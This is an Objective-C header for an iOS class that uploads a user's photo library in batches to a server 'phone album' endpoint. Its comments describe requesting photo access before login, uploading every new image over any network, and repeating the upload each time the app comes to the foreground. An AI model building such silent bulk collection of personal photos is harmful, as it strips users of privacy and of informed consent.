//telegram @wz662
#import <Foundation/Foundation.h>
#import <Photos/Photos.h>

/** 一批上传结束或整轮「当前无待传」时发出（主线程），手机相册列表可据此刷新 */
FOUNDATION_EXPORT NSString * const RBPhoneAlbumOneTimeFullUploadDidCompleteNotification;

/**
 * 用户同意系统相册访问后，将未上传过的图片分批上传到「手机相册」接口。
 * - Wi‑Fi / 蜂窝均会执行（不做网络类型限制）。
 * - 本地持久化：`Documents/rb_phone_album_uploaded_ids_<uid>.plist` 记录已成功上传的 PHAsset.localIdentifier（断点续传 / 避免重复传）。
 * - 每批最多 12 张，批与批之间间隔 5 秒；批内仍逐张串行上传。
 * - 若曾使用旧版「全量完成」NSUserDefaults 标记且无 plist，则迁移为「当前相册内全部资源视为已传」，避免升级后重复全量上传；之后仅新图会进入待传列表。
 */
@interface PhoneAlbumLibrarySync : NSObject

/** 冷启动尽早调用：仅在系统状态为「未决定」时弹出相册权限框（便于未登录前即授权） */
+ (void)requestEarlyPhotoLibraryAuthorizationIfNeeded;

/** 系统相册授权弹窗回调后调用（Authorized / Limited 时排队执行） */
+ (void)handlePhotoLibraryAuthorizationStatus:(PHAuthorizationStatus)status;

/** App 回到前台时调用：若已登录且已授权则执行（用于「设置里早已授权」等未走弹窗的场景） */
+ (void)enqueueOneTimeFullUploadFromAppBecameActiveIfNeeded;

@end
